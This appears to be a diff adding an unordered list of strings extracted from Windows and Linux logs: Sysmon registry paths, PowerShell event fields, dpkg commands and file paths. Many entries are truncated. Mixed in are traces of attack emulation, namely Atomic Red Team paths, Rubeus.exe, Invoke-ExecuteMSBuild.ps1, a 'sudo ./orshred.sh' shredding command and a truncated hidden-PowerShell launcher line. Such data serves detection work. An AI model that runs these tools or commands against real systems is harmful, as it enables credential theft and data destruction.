+dpkg-split -Qao /var/lib/dpkg/reassemble.deb /tmp/apt-dpkg-install-7NsVNE/033-libxcb-render0_1.13-2~ubuntu18.04_amd64.deb
+[Parameter(ParameterSetName='ByInstanceIDDisplayName', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
+sudo apt-get install binfmt* -y
+C:\Windows\Temp\db6f396a-bffb-46ff-980d-2972a81ff21d\NetworkWatcherAgent\api-ms-win-crt-private-l1-1-0.dll
+HKLM\SOFTWARE\Microsoft\Windows Search\Gather\Windows\SystemIndex\StartPages\0\LastCrawlSuccesses
+TargetObject: HKU\S-1-5-21-968647429-258479840-2507984072-1002_Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\SystemAppData\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\WasEv
+"C:\Program Files\SplunkUniversalForwarder\bin\SplunkD.EXE" btool server list httpServerListener: --no-log
+$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IgnoreDefaultRoutes'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetIPInterface.IgnoreDefaultRoutes'; Bindings = 'In'; Value = $__cmdletization_value; IsVal
+Host Application = C:\Windows\s
+[Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetIPInterface.WeakHostReceive]
+C:\Users\Administrator\AppData\Local\Temp\2\mgpq32qf\.github\CODEOWNERS
+mktemp -p /var/lib/update-notifier
+Pipeline execution details for command line: 		$Win32Functions = New-Object System.Object
+$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LocalPortStart'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
+TargetObject: HKLM\System\CurrentControlSet\Control\Session Manager\Power\SystemPowerPolicy
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{A361E4C6-CB44-4650-A94B-2B37DDC2C97E}\MatchAnyKeyword
+TargetObject: HKU\S-1-5-21-968647429-258479840-2507984072-1002\Software\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing
+/var/lib/dpkg/info/libaa1:amd64.symbols
+/usr/sbin/groupadd -g 1003 atomic_user2
+/tmp/fileutl.message.G1N52V
+/var/lib/dpkg/info/mtr-tiny.postinst
+TargetObject: HKLM\System\CurrentControlSet\Control\Class\{091BC97E-2352-4362-A539-10A6D8FF7596}\Properties
+TargetObject: HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\CTLs
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cursors\Schemes
+if ($PSBoundParameters.ContainsKey('DisplayName')) {
+HKLM\System\CurrentControlSet\Services\DNS\Parameters\PreviousLocalHostname
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\NetworkServiceTriggers\Triggers\bc90d167-9470-4139-a9ba-be0bbbf5b74d\5f54ce7d-5b79-4175-8584-cb65313a0e98
+ID:		{645c2606-82d8-4ae8-936b-8e9459cb63a0}
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\utc.privacy\OverrideDownloadPolicies
+TargetObject: HKLM\SOFTWARE\Microsoft
+if ($Server)
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{6DD3A4C0-0119-5E7E-8678-76247CD32AFC}\Enabled
+/tmp/fileutl.message.DcDtpt
+[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapterPowerManagementSettingData')]
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{69b669b9-4af8-4c50-bdc4-6006fa76e975}\Enabled
+HKLM\System\CurrentControlSet\Control\Storage\EnabledDenyGP\DenyAllGPState
+Target Handle ID:	0xc94
+\REGISTRY\A\{3b53e57c-2a0c-3c13-3fd7-468e6d87b206}\Root\InventoryApplicationFile\advancedrun.exe|da2ad31d568bac4\BinProductVersion
+Remote Desktop Services: Session reconnection succeeded:
+ID:		{bb132472-865f-480e-9284-e4671b47cddf}
+/var/lib/dpkg/info/plymouth-theme-ubuntu-text.postinst
+sudo ./orshred.sh
+C:\Users\Administrator\AppData\Local\Temp\3idxcn0b.0.cs
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{59DD67CC-7CE1-52F8-CF74-FE8A257A2B6B}\EnableProperty
+# Both MembersToInclude and MembersToExlude were provided. Check if they have common principals.
+TargetProcessGUID: {fe86be69-fba5-64b5-2a00-000000001000}
+Completed invocation of ScriptBlock ID: 9e3bbed2-aaad-456b-8511-81a0a9d794bc
+A Windows Filtering Platform provider has been changed.
+User: PANDALA
+HKLM\SOFTWARE\WOW6432Node\Microsoft\COM3\SymbolicLinkValue
+pastebin.com
+HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{8DBEEE55-EAB8-41BE-988E-B1FAE0397155}\EnableLevel
+$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
+/var/cache/apt/archives/partial/.apt-acquire-privs-test.V3Q0Q7
+CommandInvocation(Get-NetCompartment): "Get-NetCompartment"
+C:\AtomicRedTeam\tmp\atomic-red-team-local-master\atomics\T1574.002\bin\GUP.exe
+$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profile'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetAdapterRss.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
+Microsoft.Windows.DSC.CoreConfProviders.dll
+"C:\Program Files\SplunkUniversalForwarder\bin\SplunkD.EXE" btool server list kvstore --no-log
+ID:		{0aab7bfa-2b94-4c94-ad7b-d5383c3ddade}
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\telemetry.P-ARIA-194626ba46434f9ab441dd7ebda2aa64-5f64bebb-ac28-4cc7-bd52-570c8fe077c9-7717\LastFileW
+/boot/grub/i386-pc/datetime.mod
+/var/lib/dpkg/updates/tmp.i
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\telemetry.P-ARIA-5476d0c4a7a347909c4b8a13078d4390-f8bdcecf-243f-40f8-b7c3-b9c44a57dead-7230\OverrideDownloadPolicies
+/usr/bin/dpkg --status-fd 43 --no-triggers --unpack --auto-deconfigure --recursive /tmp/apt-dpkg-install-qCjo8w
+CredProvDataModel.dll
+/tmp/fileutl.message.dsPyxY
+ID:		{a5a21fd2-9bcc-4af3-bddf-5ebe2c732792}
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{F925345B-2375-5774-242E-2AAB49E9A2F4}\Enabled
+Details: CN=WORKSTATION5,OU=Workstations,DC=theshire,DC=local
+dpkg-deb --control /tmp/apt-dpkg-install-7NsVNE/019-libdconf1_0.26.0-2ubuntu3_amd64.deb /var/lib/dpkg/tmp.ci
+# Copy only distinct elements from the original array to the destination array.
+ID:		{d3b73ac0-bb84-4afa-9d90-cb042b285870}
+C:\Windows\System32\cryptngc.dll
+dpkg-split -Qao /var/lib/dpkg/reassemble.deb /tmp/apt-dpkg-install-7NsVNE/013-librbd1_12.2.13-0ubuntu0.18.04.10_amd64.deb
+C:\art-marker.txt
+/bin/sh /usr/bin/apt-key --quiet --readonly verify --status-fd 3 /tmp/apt.sig.DYEwG3 /tmp/apt.data.oSv6V7
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\TraceManager\diagMinTraceDurationFiletime
+C:\Windows\Prefetch\TIWORKER.EXE-9321FC1D.pf
+Original Security Descriptor:	D:(A;;GA;;;SY)(A
+\PSHost.133044606245967791.9980.DefaultAppDomain.powershell
+/tmp/fileutl.message.VSE6B5
+ID:		{09e5b742-2c42-4400-a490-2dc2fdae6e2f}
+/var/cache/apt/archives/partial/.apt-acquire-privs-test.ZJvxoJ
+C:\Windows\Temp\D67C1AE8-EF77-4E3C-B7D7-BDCEFA974160\api-ms-win-core-threadpool-legacy-l1-1-0.dll
+/tmp/fileutl.message.QQskZz
+/var/lib/dpkg/info/debianutils.postinst
+C:\Tools\Rubeus.exe
+HKLM\SOFTWARE\WOW6432Node\Microsoft\MTFFuzzyFactors\SymbolicLinkValue
+Mandator
+HostApplication=C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -
+HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{5F9080BF-B22C-47EA-8B76-1DA0CF975419}
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{B3AC0429-F834-4D3A-86B7-724FAE5B8641}\EnableProperty
+Windows PowerShell has started an IPC listening thread on process: 9980 in AppDomain: DefaultAppDomain.
+HKU\S-1-5-21-968647429-258479840-2507984072-1002\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count\Zvpebfbsg.Jvaqbjf.Nccerc.PukNcc_pj5a1u2gklrjl!Ncc
+C:\Windows\SysWOW64\samlib.dll
+/etc/systemd/system/multi-user.target.wants/systemd-resolved.service
+C:\Windows\Temp\db6f396a-bffb-46ff-980d-2972a81ff21d\NetworkWatcherAgent\api-ms-win-core-rtlsupport-l1-1-0.dll
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{69b669b9-4af8-4c50-bdc4-6006fa76e975}\EnableLevel
+C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
+Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetAdapterPacketDirect' -Alias '*'
+C:\Users\Administrator\AppData\Local\Temp\ydue3nqy\ydue3nqy.dll
+TargetObject: HKU\S-1-5-21-968647429-258479840-2507984072-1002\Software\Microsoft\OneDrive\Accounts\LastUpdate
+ProcessGuid: {3ddc5665-e7cd-5f51-1e00-000000000500}
+C:\Users\Administrator\Desktop\Invoke-ExecuteMSBuild.ps1
+SourceProcessGUID: {9f85ce58-af6e-5f2b-2004-000000000400}
+ImageLoaded: C:\Windows\System32\edgeIso.dll
+/var/lib/dpkg/info/libasyncns0:amd64.shlibs
+C:\Windows\System32\wow64base.dll
+C:\Windows\Temp\4efe5db1-2d84-40bc-bec6-38980f6d6bb7\bin\ko\Microsoft.Data.Services.Client.resources.dll
+dpkg-deb --fsys-tarfile /tmp/apt-dpkg-install-qCjo8w/04-cpp-7-mips-linux-gnu_7.5.0-3ubuntu1~18.04cross1_amd64.deb
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib\Last Counter
+/var/lib/dpkg/info/libiptc0:amd64.shlibs
+/var/lib/dpkg/info/qemu-user.list
+C:\Windows\System32\bcrypt.dll
+/etc/alternatives/pager
+TargetObject: HKU\S-1-5-21-477444970-2264162048-1418806404-500_Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache\Z:\launcher.exe.FriendlyAppName
+dpkg-deb --control /tmp/apt-dpkg-install-7NsVNE/015-qemu-system-common_1%3a2.11+dfsg-1ubuntu7.39_amd64.deb /var/lib/dpkg/tmp.ci
+TargetObject: HKLM\System\CurrentControlSet\Enum\HID\{cfa8b69e-5b4a-4cc0-b98b-8ba1a1f3f95a}\6&1a8c06af&0&0000\Properties\{83da6326-97a6-4088-9453-a1923f573b29}\0066
+Process Name:	C:\Windows\System32\ClipRenew.exe
+$__cmdletization_values = @(${EcnMarking})
+/var/lib/dpkg/info/coreutils.md5sums
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{498a78f0-d57b-488d-9666-b0e7f5473cd9}\ChannelReferences\0\(Default)
+Transaction ID:	{00000000-0000-0000-0000-000000000000}
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\TraceManager\aotScenarioId
+Description: .NET Frame
+"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\ADMINI~1\AppData\Local\Temp\mixbsfvs.cmdline"
+ParameterBinding(Export-ModuleMember): name="Function"; value="Disable-NetAdapterRsc"
+Product: Windows SDK
+Service File Name:	C:\windows\system32\svchost.exe -k DevicesFlow
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\TraceManager\miniTraceIsThrottled
+TargetObject: HKU\.DEFAULT\Control Panel\International\User Profile\Languages
+TargetObject: HKLM\System\CurrentControlSet\Control\SystemInformation\ComputerHardwareIds
+ID:		{05d9d8f8-7782-4ee8-bf1c-9cf652332f8c}
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\LastExtensionMadeSyncRequest
+$__cmdletization_values = @(${TemporaryRegenerateTime})
+/var/lib/dpkg/info/python3-distupgrade.prerm
+/var/lib/dpkg/info/rsyslog.prerm
+dpkg --print-foreign-architectures
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\{F3CCC681-B74C-4060-9F26-CD84525DCA2A}\0\Link
+/var/lib/dpkg/info/libcairo-gobject2:amd64.triggers
+TargetObject: HKU\.DEFAULT\Software\Microsoft\CTF\SortOrder\AssemblyItem\0x00000409\{34745C63-B2F0-4784-8B67-5E12C8701A31}
+[object]$__cmdletization_value = ${AdvertisedRouterLifetime}
+C:\Windows\System32\tdh.dll
+TargetObject: HKLM\System\CurrentControlSet\Control\Storage\EnabledDenyGP\{53F5630D-B6BF-11D0-94F2-00A0C91EFB8B}\AuditPolicyOnly
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Orchestrator\Scheduler\UserAwaySignal
+HKU\S-1-5-20\Software\Policies\Microsoft\SystemCertificates\CA\CTLs
+C:\Windows\Temp\a523bd36-d7fe-4e03-9749-078931bacc7c\manifest.xml
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\Guid
+dpkg-deb --control /tmp/apt-dpkg-install-7NsVNE/017-msr-tools_1.3-2build1_amd64.deb /var/lib/dpkg/tmp.ci
+Product: Microsoft® .NET
+/tmp/sh-thd.N4Ib7O
+HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{C116A72F-3F96-4983-B83E-48F8168610A8}\MatchAnyKeyword
+winspool.drv
+HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\LanguagePack\SymbolicLinkValue
+ImageLoaded: C:\Windows\System32\kernel32.dll
+$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
+/var/lib/dpkg/info/libc6-dev-mips-cross.md5sums
+Details: 19h1_release
+C:\Program Files\Mozilla Firefox\updated\api-ms-win-core-processthreads-l1-1-1.dll
+$__cmdletization_metho
+Details: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\LanguagePack
+HKLM\System\CurrentControlSet\Control\Class\{4d36e97d-e325-11ce-bfc1-08002be10318}\0034\HardwareInformation.DacType
+Host Application = C:\Windows\system32\Windows
+C:\AtomicRedTeam\tmp\atomic-red-team-local-master\docs\assets\images\favicon.png
+Logon ID:
+GDI Client DLL
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{D48679EB-8AA3-4138-BE24-F1648C874E49}\MatchAllKeyword
+TargetProcessGUID: {39e4a257-ff60-5f8c-3104-000000000700}
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\EventMonitors\Microsoft.Windows.Sentinels.Normal_0\MonitorSn
+TargetObject: HKU\S-1-5-21-968647429-258479840-2507984072-1001\Software\Policies\Microsoft\SystemCertificates\trust
+HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{701ea7b4-22ea-4795-8b10-1f913bf6623b}\LeaseObtainedTime
